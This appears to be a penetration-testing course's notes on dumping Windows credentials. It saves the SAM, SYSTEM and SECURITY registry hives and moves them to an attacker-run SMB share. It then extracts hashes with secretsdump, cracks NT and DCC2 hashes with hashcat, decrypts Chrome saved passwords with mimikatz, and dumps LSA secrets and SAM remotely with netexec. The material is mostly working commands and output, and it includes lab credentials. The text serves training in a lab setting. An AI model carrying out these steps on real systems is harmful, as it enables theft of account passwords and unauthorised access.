## Registry hives

There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.|

#### Using reg.exe to copy registry hives

```cmd
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

#### Creating a share with smbserver

```shell
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

Once the share is running on our attack host, we can use the `move` command on the Windows target to transfer the hive copies to the share.

##### Moving Hive copies to share

```cmd
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```

## Dumping hashes with secretsdump

```shell-session
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

the first step `secretsdump` performs is retrieving the `system bootkey` before proceeding to dump the `local SAM hashes`. This is necessary because the bootkey is used to encrypt and decrypt the SAM database. Without it, the hashes cannot be decrypted — which is why having copies of the relevant registry hives  is crucial.


## Cracking hashes with Hashcat

```shell-session
sudo vim hashestocrack.txt

64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
6f8c3f4d3869a10f3b4f0522f537fd33
184ecdda8cf1dd238d438c4aea4d560d
f7eb9c06fafaa23c4bcf22ba6781c1e2
```


#### Running Hashcat against NT hashes

```shell
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```


## DCC2 hashes

As mentioned previously, `hklm\security` contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:


```
inlanefreight.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25
```

This type of hash is much more difficult to crack than an NT hash
it cannot be used for lateral movement with techniques like Pass-the-Hash

```shell 
 hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

## DPAPI

The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

|Applications|Use of DPAPI|
|---|---|
|`Internet Explorer`|Password form auto-completion data (username and password for saved sites).|
|`Google Chrome`|Password form auto-completion data (username and password for saved sites).|
|`Outlook`|Passwords for email accounts.|
|`Remote Desktop Connection`|Saved credentials for connections to remote machines.|
|`Credential Manager`|Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more.|

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).


```cmd-session
C:\Users\Public> mimikatz.exe
mimikatz # dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
> Encrypted Key found in local state file
> Encrypted Key seems to be protected by DPAPI
 * using CryptUnprotectData API
> AES Key is: efefdb353f36e6a9b7a7552cc421393daf867ac28d544e4f6f157e0a698e343c

URL     : http://10.10.14.94/ ( http://10.10.14.94/login.html )
Username: bob
 * using BCrypt with AES-256-GCM
Password: April2025!
```


## Remote dumping & LSA secrets considerations

With access to credentials that have `local administrator privileges`, it is also possible to target LSA secrets over the network.

#### Dumping LSA secrets remotely

```shell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

#### Dumping SAM Remotely

```shell
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

